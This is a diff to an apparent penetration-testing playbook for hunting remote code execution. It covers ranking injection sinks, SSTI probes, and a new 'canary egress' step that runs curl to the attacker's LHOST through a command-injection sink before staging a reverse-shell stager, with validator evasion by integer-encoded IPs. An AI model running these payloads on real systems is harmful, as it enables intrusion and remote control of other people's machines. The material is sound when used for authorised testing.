@@ -9,14 +9,16 @@ description: RCE hunting - template injection, YAML/XML deserialization, depende
 
 ## Wiki
 
-```
 qmd_query "remote code execution command injection template injection deserialization CVE" via wiki-search MCP
-```
 
-Hub: [[web-moc]] (live web index). Primary page: [[os-command-injection]]. Payload arsenal: `wiki/payloads/command-injection.md`.
-Anchors: [[ssti]], [[insecure-deserialization]].
+Hub: [[web-moc]] · Primary page: [[os-command-injection]] · Payload arsenal: `wiki/payloads/command-injection.md`
+Anchors: [[ssti]], [[insecure-deserialization]]
+**REFS:** [[os-command-injection]], wiki/payloads/command-injection.md
 
 ## Attack surface signals
+
+**APPROACH:** Rank config/template editors, render/import endpoints and deserialization sinks first; prefer a vetted Metasploit module for a fingerprinted CVE, probe SSTI (`{{7*7}}`) and eval sinks (query AND body) with a safe `id`/OOB payload, then swap in a shell only after exec is proven.
+**AVOID:** A delayed response, a reflected input, a 500/stack trace, or `{{7*7}}`->49 alone is NOT RCE - blind RCE needs an OOB HIT and SSTI needs a follow-up payload reaching a runtime primitive.
 
 **Rank before probing.** Not every free-text field is equally likely to reach an interpreter:
 
@@ -87,6 +89,8 @@ curl -X POST http://target:8080/functionRouter \
 `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/os-command-injection.md`
 
 **Safe-PoC first.** Every probe above runs `id` (or a bare OOB callback), never a destructive command. Only after a callback or command output confirms the sink do you swap in a reverse shell. Never run a state-changing command (delete, overwrite, service restart) to prove exec - `id` proves it and destroys nothing.
+
+**Canary egress BEFORE any callback-dependent payload.** Before staging a revshell/stager, fire one `$()` probe that fetches a known file from your LHOST through the same sink (`curl -sm2 LHOST/canary`) and confirm the hit server-side. Multi-homed attack seats have several addresses - the target can usually route to only ONE (wrong-iface payloads hang the app and can wedge a single-threaded service for minutes). The canary also proves which egress ports survive the target's outbound firewall; serve your stager on an allowed port, and shorten payloads to fit tight validators by encoding IPv4 as an integer (see [[websocket-attacks]] client-hint section). Delivery helper: `bash scripts/stager.sh <lhost> [port] <payload>` (serves it + prints the int-IP one-liner); managed listener: `bash scripts/vm-handler.sh <lhost>`.
 
 ## Template Injection RCE Payloads
 ```python
